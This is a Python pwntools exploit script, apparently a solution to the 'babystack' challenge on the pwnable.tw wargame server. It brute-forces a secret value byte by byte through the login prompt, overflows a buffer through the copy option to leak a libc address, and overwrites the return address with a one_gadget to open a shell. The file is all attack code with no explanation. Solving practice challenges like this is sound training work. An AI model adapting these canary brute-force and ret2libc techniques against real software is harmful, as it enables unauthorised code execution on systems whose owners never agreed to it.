from pwn import *

exe = context.binary = ELF('./babystack_patched', checksec=False)
libc = ELF('./libc_64.so.6', checksec=False)
# r = exe.process()
# gdb.attach(r, api=True, gdbscript='''
#         #    b*0x555555400f78
#         #    b*0x555555400e2a
#         #    b*0x555555400ebb
#         # b* 0x555555400ea5
#         #    b*0x555555400e43
#            ''')

r = remote('chall.pwnable.tw', 10205)

def bruteforce(len, size, ran = b''):
    for i in range(0, len):
        for i in range(1, 255):
            if i == 10:
                continue
            payload = ran + p8(i)
            r.sendafter(b'>> ', b'1'*size)
            r.sendafter(b'passowrd :', payload)
            out = r.recv(6)
            print(payload)
            if b'Login' in out:
                ran += p8(i)
                r.sendafter(b'>> ', b'1'*size)
                print(ran)
                break
    return ran

binary_off = 0x1060
exe.sym['pop_rdi'] = 0x00000000000010c3
exe.sym['bp'] = 0x0000000000000FD4
libc_off = 0x6ffb4
libc.sym['one_gadget'] = 0x45216

            
payload = b'\x00'*39
r.sendafter(b'>> ', b'1')
r.sendafter(b'passowrd :', payload)
r.sendafter(b'>> ', b'1')

ran = bruteforce(16, 16)
# ran += b'\x00'*2

# binary_leak = u64(ran[32:40])
# print(hex(binary_leak))
# exe.address = binary_leak - binary_off
# print(hex(exe.address))
# print(hex(exe.sym['bp']))

payload = b'\x00'+ b'a'*63 + ran + b'a'*8
r.sendafter(b'>> ', b'1')
r.sendafter(b'passowrd :', payload)
r.sendafter(b'>> ', b'3')
r.sendafter(b'Copy :', b'a')

ran_ = ran + b'1'* 8

r.sendafter(b'>> ', b'1')
payload = b'\x00'*64
r.sendafter(b'>> ', b'1')
r.sendafter(b'passowrd :', payload)
r.sendafter(b'>> ', b'1')
out = bruteforce(6, 8, ran_)

libc_leak = u64(out[24:30] + b'\x00'*2)
libc.address = libc_leak - libc_off
print(hex(libc.address))

payload = b'\x00' + b'a'*63 + ran + b'a'*24 + p64(libc.sym['one_gadget'])
r.sendafter(b'>> ', b'1')
r.sendafter(b'passowrd :', payload)
r.sendafter(b'>> ', b'3')
r.sendafter(b'Copy :', b'a')

r.interactive()